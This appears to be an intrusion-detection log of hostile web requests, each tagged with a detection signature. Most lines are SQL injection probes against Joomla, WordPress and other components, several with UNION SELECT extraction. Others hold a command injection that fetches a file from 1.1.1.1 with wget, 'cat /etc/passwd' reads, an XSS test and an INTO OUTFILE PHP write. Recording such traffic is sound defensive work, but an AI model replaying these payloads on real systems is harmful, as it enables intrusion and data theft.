2021-09-04T11:19	/appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)	s2b-1330-5
2021-09-04T11:19	/index.php?option=com_jsptickets&controller=ticketlist&task=edit&ticketcode=1 and 1=1::/www/index.php?option=com_jsptickets&controller=statuslist&task=edit&id=1 and 1=1::/www/index.php?option=com_jsptickets&controller=prioritylist&task=edit&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jsptickets&controller=ticketlist&task=edit&ticketcode=1 and 1=1::/www/index.php?option=com_jsptickets&controller=statuslist&task=edit&id=1 and 1=1::/www/index.php?option=com_jsptickets&controller=prioritylist&task=edit&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jgive&view=campaigns&layout=all&filter_org_ind_type=1 and 1=1::/www/index.php/more/campaigns-in-pin-display/campaigns/all/search/:?campaign_countries=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jgive&view=campaigns&layout=all&filter_org_ind_type=1 and 1=1::/www/index.php/more/campaigns-in-pin-display/campaigns/all/search/:?campaign_countries=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_medialibrary&task=view_author&id=1 and 1=1::/www/index.php/component/medialibrary/0/lend_request?Itemid=0&mid[0]=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_medialibrary&task=view_author&id=1 and 1=1::/www/index.php/component/medialibrary/0/lend_request?Itemid=0&mid[0]=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_simplecalendar&view=events&catid[0]=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_simplecalendar&view=events&catid[0]=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/component/smartshoutbox/archive?shoutauthor=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/component/smartshoutbox/archive?shoutauthor=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_gallery_wd&tag_id=&view=GalleryBox&gallery_id=71 and 1=1::/www/index.php?option=com_gallery_wd&tag_id=1 and 1=1&view=GalleryBox&gallery_id=7	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_gallery_wd&tag_id=&view=GalleryBox&gallery_id=71 and 1=1::/www/index.php?option=com_gallery_wd&tag_id=1 and 1=1&view=GalleryBox&gallery_id=7	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_advertisementboard&Itemid=132&task=show_rss_categories&catname=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_advertisementboard&Itemid=132&task=show_rss_categories&catname=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jquickcontact&task=refresh&sid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jquickcontact&task=refresh&sid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_ccnewsletter&task=removeSubscriber&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_ccnewsletter&task=removeSubscriber&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_avreloaded&view=popup&Itemid=55&divid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_avreloaded&view=popup&Itemid=55&divid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_formmaker&view=stats&id=1 and 1=1::/www/index.php?option=com_formmaker&view=stats&form_id=1&id=1&from=1 and 1=1::/www/index.php?option=com_formmaker&view=stats&form_id=1&id=1&to=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_formmaker&view=stats&id=1 and 1=1::/www/index.php?option=com_formmaker&view=stats&form_id=1&id=1&from=1 and 1=1::/www/index.php?option=com_formmaker&view=stats&form_id=1&id=1&to=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_staffmaster&view=staff&name=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_staffmaster&view=staff&name=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_aist&view=showvacancy&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_aist&view=showvacancy&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php/component/jsjobs/newest-jobs?zipcode=1 and 1=1&option=com_jsjobs&task11=view::/www/index.php?option=com_jsjobs&c=resume&view=resume&layout=view_resume&bd=1&sortby=1&ta=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php/component/jsjobs/newest-jobs?zipcode=1 and 1=1&option=com_jsjobs&task11=view::/www/index.php?option=com_jsjobs&c=resume&view=resume&layout=view_resume&bd=1&sortby=1&ta=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?dynfield[phone]=1 and 1=1&option=com_dtracker&task=save:index.php?option=com_dtracker&layout=download&sess=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?dynfield[phone]=1 and 1=1&option=com_dtracker&task=save:index.php?option=com_dtracker&layout=download&sess=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_realpin&pinboard=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_realpin&pinboard=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jsautoz&c=vehicle&view=vehicle&layout=listvehicles&vtype=1 and 1=1::/www/index.php?option=com_jsautoz&c=vehicle&view=vehicle&layout=listvehicles&pre=1 and 1=1::/www/index.php?option=com_jsautoz&c=vehicle&view=vehicle&layout=listvehicles&prs=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jsautoz&c=vehicle&view=vehicle&layout=listvehicles&vtype=1 and 1=1::/www/index.php?option=com_jsautoz&c=vehicle&view=vehicle&layout=listvehicles&pre=1 and 1=1::/www/index.php?option=com_jsautoz&c=vehicle&view=vehicle&layout=listvehicles&prs=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jomestate&task=detailed&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jomestate&task=detailed&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_bookpro&view=orderdetail&order_number=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_bookpro&view=orderdetail&order_number=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_fastball&view=player&season=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_fastball&view=player&season=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_invitex&view=invites&invite_type=1 and 1=1&invite_anywhere=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_invitex&view=invites&invite_type=1 and 1=1&invite_anywhere=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_gmap&view=gm_markers&tmpl=component&layout=form_markers&cid=1 and 1=1&id=1&format=raw::/www/index.php?option=com_gmap&view=gm_markers&tmpl=component&layout=form_markers&cid=1&id=1 and 1=1&format=raw::/www/index.php?option=com_gmap&view=gm_modal&tmpl=component&layout=default&map=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_gmap&view=gm_markers&tmpl=component&layout=form_markers&cid=1 and 1=1&id=1&format=raw::/www/index.php?option=com_gmap&view=gm_markers&tmpl=component&layout=form_markers&cid=1&id=1 and 1=1&format=raw::/www/index.php?option=com_gmap&view=gm_modal&tmpl=component&layout=default&map=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_timetable&view=event&alias=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_timetable&view=event&alias=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_dtregister&task=edit&controller=category&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_dtregister&task=edit&controller=category&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jticketing&view=events&layout=all&filter_creator=1 and 1=1::/www/index.php?option=com_jticketing&view=events&layout=all&filter_events_cat=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jticketing&view=events&layout=all&filter_creator=1 and 1=1::/www/index.php?option=com_jticketing&view=events&layout=all&filter_events_cat=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_saxumnumerology&view=savedresult&publicid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_saxumnumerology&view=savedresult&publicid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_saxumpicker&view=savedspread&publicid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_saxumpicker&view=savedspread&publicid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_squadmanagement&task=removewarround&id=1 and 1=1::/www/index.php?option=com_squadmanagement&controller=appointment&task=deleteappointment&id=1 and 1=1::/www/index.php?option=com_squadmanagement&controller=appointment&task=removefromappointment&id=1 and 1=1::/www/index.php?option=com_squadmanagement&view=editsquad&format=memberlist&squadid=1 and 1=1::/www/index.php?option=com_squadmanagement&controller=squadmembers&task=addmember&squadid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_squadmanagement&task=removewarround&id=1 and 1=1::/www/index.php?option=com_squadmanagement&controller=appointment&task=deleteappointment&id=1 and 1=1::/www/index.php?option=com_squadmanagement&controller=appointment&task=removefromappointment&id=1 and 1=1::/www/index.php?option=com_squadmanagement&view=editsquad&format=memberlist&squadid=1 and 1=1::/www/index.php?option=com_squadmanagement&controller=squadmembers&task=addmember&squadid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_saxumastro&view=savedreading&publicid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_saxumastro&view=savedreading&publicid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_projectlog&view=cat&search=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_projectlog&view=cat&search=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_cwtags&searchtext[]=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_cwtags&searchtext[]=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_abook&view=category&letter=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_abook&view=category&letter=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php/component/ekrishta/alluser?options=com_ekrishta&view=alluser&gender=1 and 1=1&age1=1 and 1=1&age2=1 and 1=1&religion=1 and 1=1&mothertounge=1 and 1=1&caste=1 and 1=1&country=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php/component/ekrishta/alluser?options=com_ekrishta&view=alluser&gender=1 and 1=1&age1=1 and 1=1&age2=1 and 1=1&religion=1 and 1=1&mothertounge=1 and 1=1&caste=1 and 1=1&country=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_checklist&view=frontend&title_search=1 and 1=1&tag_search=1 and 1=1&name_search=1 and 1=1&description_search=1 and 1=1&filter_order=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_checklist&view=frontend&title_search=1 and 1=1&tag_search=1 and 1=1&name_search=1 and 1=1&description_search=1 and 1=1&filter_order=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/os-property-layouts/search-tools/advanced-search?&option=com_osproperty&task=property_advsearch&cooling_system1=1 and 1=1&heating_system1=1 and 1=1&laundry=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/os-property-layouts/search-tools/advanced-search?&option=com_osproperty&task=property_advsearch&cooling_system1=1 and 1=1&heating_system1=1 and 1=1&laundry=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/jobs.php?status=0&level_id=&client_id=0&start_time=&end_time=&orderby=jobid&jobs_per_page=25&pool_id=11' UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#::/client-report.php?period=7&client_id=21 UNION ALL SELECT NULL,@@version#	script-HTTP::URI_SQLI
2021-09-04T11:19	/jobs.php?status=0&level_id=&client_id=0&start_time=&end_time=&orderby=jobid&jobs_per_page=25&pool_id=11' UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#::/client-report.php?period=7&client_id=21 UNION ALL SELECT NULL,@@version#	script-HTTP::URI_SQLI
2021-09-04T11:19	/mobile-loja/mensagem.asp?msgid=0&msgstr=Venda on-line encerrada. Adquira seu ingresso nos pontos oficiais ou na bilheteria do evento.&eve_cod=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/mobile-loja/mensagem.asp?msgid=0&msgstr=Venda on-line encerrada. Adquira seu ingresso nos pontos oficiais ou na bilheteria do evento.&eve_cod=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/user_contacts.php?user=0' UNION SELECT 1,2,3,version(),5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10 -- 2::/view_channel.php?user=0' UNION SELECT 1,2,3,version(),5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10 -- 2::/view_page.php?pid=0' UNION SELECT 1,2,3,4,5,version(),7,8,9,10 -- 2::/view_topic.php?tid=0' UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12 -- 2	script-HTTP::URI_SQLI
2021-09-04T11:19	/user_contacts.php?user=0' UNION SELECT 1,2,3,version(),5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10 -- 2::/view_channel.php?user=0' UNION SELECT 1,2,3,version(),5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10 -- 2::/view_page.php?pid=0' UNION SELECT 1,2,3,4,5,version(),7,8,9,10 -- 2::/view_topic.php?tid=0' UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12 -- 2	script-HTTP::URI_SQLI
2021-09-04T11:19	/1.2.0/product/search?search_query=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/1.2.0/product/search?search_query=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/stats_monthly_sales.php?status='<script>alert(do cument.cookie);</script>::/admin/stats_monthly_sales.php?status=0 union select '<? php_code ?>' INTO OUTFILE '../../../path/to/site/file.php'	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/stats_monthly_sales.php?status='<script>alert(do cument.cookie);</script>::/admin/stats_monthly_sales.php?status=0 union select '<? php_code ?>' INTO OUTFILE '../../../path/to/site/file.php'	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/stats_monthly_sales.php?status=%27%3Cscript%3Ealert%28do%20cument.cookie%29;%3C/script%3E::/admin/stats_monthly_sales.php?status=0%20union%20select%20'%3C?%20php_code%20?%3E'%20INTO%20OUTFILE%20'../../../path/to/site/file.php'	s2b-1113-5
2021-09-04T11:19	/admin/?do=disporders&action=detail&id=1+and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,database(),34,35,version(),37,38+--+::/admin/?do=editcurrency&cid=1+and+1=2+union+select+1,database(),3,version(),5+--+::/admin/?do=subadminmgt&action=edit&id=1+and+1=2+union+select+1,version(),3,database(),5+--+	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/?do=disporders&action=detail&id=1+and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,database(),34,35,version(),37,38+--+::/admin/?do=editcurrency&cid=1+and+1=2+union+select+1,database(),3,version(),5+--+::/admin/?do=subadminmgt&action=edit&id=1+and+1=2+union+select+1,version(),3,database(),5+--+	script-HTTP::URI_SQLI
2021-09-04T11:19	/jclassifiedsmanager/classifieds/offerring-ads?controller=displayads&view=displayads&task=viewad&id=1 and SELECT * FROM table1	script-HTTP::URI_SQLI
2021-09-04T11:19	/jclassifiedsmanager/classifieds/offerring-ads?controller=displayads&view=displayads&task=viewad&id=1 and SELECT * FROM table1	script-HTTP::URI_SQLI
2021-09-04T11:19	/ecommercemajor/product.php?productbycat=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/ecommercemajor/product.php?productbycat=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?act=category&cid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?act=category&cid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version(),3,4+--+::/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version(),database(),4+--+::/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database(),3,4,5,version(),7,8,9+--+::/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database(),version(),4+--+::/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version(),database(),user(),5+--+::/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version(),3,4+--+::/admin.php?type=page&action=update&p=1+and+substring(version(),1,1)=5+--+	s2b-1301-11
2021-09-04T11:19	/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version(),3,4+--+::/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version(),database(),4+--+::/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database(),3,4,5,version(),7,8,9+--+::/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database(),version(),4+--+::/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version(),database(),user(),5+--+::/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version(),3,4+--+::/admin.php?type=page&action=update&p=1+and+substring(version(),1,1)=5+--+	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version(),3,4+--+::/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version(),database(),4+--+::/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database(),3,4,5,version(),7,8,9+--+::/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database(),version(),4+--+::/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version(),database(),user(),5+--+::/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version(),3,4+--+::/admin.php?type=page&action=update&p=1+and+substring(version(),1,1)=5+--+	script-HTTP::URI_SQLI
2021-09-04T11:19	/script/load-calendar.php?view=1&month=6&year=2013&cid=1cat /etc/passwd::/script/load-calendar.php?cid=1cat /etc/passwd::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+1=1::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+1=2::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+substring(@@version,1,1)=5::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+substring(@@version,1,1)=4	script-HTTP::URI_SQLI
2021-09-04T11:19	/script/load-calendar.php?view=1&month=6&year=2013&cid=1cat /etc/passwd::/script/load-calendar.php?cid=1cat /etc/passwd::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+1=1::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+1=2::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+substring(@@version,1,1)=5::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+substring(@@version,1,1)=4	script-HTTP::URI_SQLI
2021-09-04T11:19	/script/load-calendar.php?view=1&month=6&year=2013&cid=1cat%20/etc/passwd::/script/load-calendar.php?cid=1cat%20/etc/passwd::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+1=1::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+1=2::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+substring(@@version,1,1)=5::/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+substring(@@version,1,1)=4	s2b-1147-7
2021-09-04T11:19	/?ym_download_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/?ym_download_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/path/showads.php?catid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/path/showads.php?catid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/cgi/client.cgi?act=list_zone&group_id=11 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/cgi/client.cgi?act=list_zone&group_id=11 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/pages/modify.php?page_id=11 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/pages/modify.php?page_id=11 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin-ajax.php?action=myextractXML&vid=1::/wp-admin/admin.php?page=newplaylist&playlistId=1::/wp-admin/admin.php?page=newvideo&videoId=1	s2b-1301-11
2021-09-04T11:19	/wordpress/wp-content/plugins/wpSS/ss_handler.php?ss_id=-20 UNION ALL SELECT 1,2,3,4	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-content/plugins/wpSS/ss_handler.php?ss_id=-20 UNION ALL SELECT 1,2,3,4	script-HTTP::URI_SQLI
2021-09-04T11:19	/bacula-web/joblogs.php?jobid=991 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/bacula-web/joblogs.php?jobid=991 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin.php?page=wrp-add-new&id=2 union select 1,user(),database(),4,5,6,7,8,9,10,11,12,13,14,15,@@version,17,18	s2b-1301-11
2021-09-04T11:19	/wp-admin/admin.php?page=wrp-add-new&id=2 union select 1,user(),database(),4,5,6,7,8,9,10,11,12,13,14,15,@@version,17,18	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin.php?page=wrp-add-new&id=2 union select 1,user(),database(),4,5,6,7,8,9,10,11,12,13,14,15,@@version,17,18	script-HTTP::URI_SQLI
2021-09-04T11:19	/acms/admin/uploads.php?id=1 and(select 1 FROM(select  count(*),concat((select (select concat(database())) FROM  information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM  information_schema.tables GROUP BY x)a)	script-HTTP::URI_SQLI
2021-09-04T11:19	/acms/admin/uploads.php?id=1 and(select 1 FROM(select  count(*),concat((select (select concat(database())) FROM  information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM  information_schema.tables GROUP BY x)a)	script-HTTP::URI_SQLI
2021-09-04T11:19	/FoeCMS/index.php?i=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/FoeCMS/index.php?i=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/modules.php?name=Submit_News&amp;subject=whatever&amp;topics[]=1 and 1=1	s2b-2565-1
2021-09-04T11:19	/modules.php?name=Submit_News&amp;subject=whatever&amp;topics[]=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/modules.php?name=Submit_News&amp;subject=whatever&amp;topics[]=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/site/default.asp?TroncoID=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/site/default.asp?TroncoID=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/download.php?category=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/download.php?category=1 and 1=1	script-HTTP::URI_SQLI
